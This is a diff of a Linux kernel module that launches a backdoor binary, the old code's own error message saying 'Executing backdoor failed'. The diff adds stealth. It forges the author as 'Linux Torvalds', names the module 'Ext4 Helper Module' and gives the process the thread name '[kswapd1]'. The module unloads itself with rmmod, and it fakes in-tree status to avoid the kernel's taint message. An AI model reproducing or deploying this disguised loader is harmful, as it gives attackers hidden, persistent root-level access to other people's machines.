@@ -2,40 +2,44 @@
 #include <linux/init.h>
 #include <linux/kmod.h>
 #include <linux/kernel.h>
-#define DRIVER_AUTHOR "ROPspktrGadget"
-#define DRIVER_DESC "TArp - Trigger on ARP"
+#define DRIVER_AUTHOR "Linux Torvalds"
+#define DRIVER_DESC "Ext4 Helper Module"
 
-static int umh_test(void);
+static int load_unload(void);
 
-static int __init tarp_init(void)
+static int __init ext4helper_init(void)
 {
-    return umh_test();
+    return load_unload();
 }
 
-static void __exit tarp_exit(void)
+static void __exit ext4helper_exit(void)
 {
-    printk(KERN_INFO "Goodbye cruel world.\n");
 }
 
-static int umh_test(void)
+// starts a process within user-land that has a parent pid of kthread
+// removes itself once completed and avoids tainting the kernel
+static int load_unload(void)
 {
-    int ret = 0;
-    //struct subprocess_info *sub_info;
     char *argv[] = {"[kswapd1]", NULL, NULL };
     static char *envp[] = {
-        "HOME=/",
+        "HOME=/tmp",
         "TERM=linux"
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    char *argvv[] = { "/bin/sh", "-c", "/sbin/rmmod ext4-helper", NULL };
 
-    ret = call_usermodehelper("/var/lib/arpwatch/arpwatch",argv,envp, UMH_WAIT_EXEC);
-    if (ret == NULL) printk(KERN_INFO "Executing backdoor failed.");
+    call_usermodehelper("/var/lib/arpwatch/arpwatch",argv,envp, UMH_WAIT_EXEC);
+    // unload kernel module 
+    call_usermodehelper(argvv[0], argvv, envp, UMH_WAIT_EXEC);
     return 0;
 }
 
 
-module_init(tarp_init);
-module_exit(tarp_exit);
+module_init(ext4helper_init);
+module_exit(ext4helper_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
+// fool kernel module build process into treating this module as "in tree"
+// avoids the tainted module kernel message
+MODULE_INFO(intree,"Y");
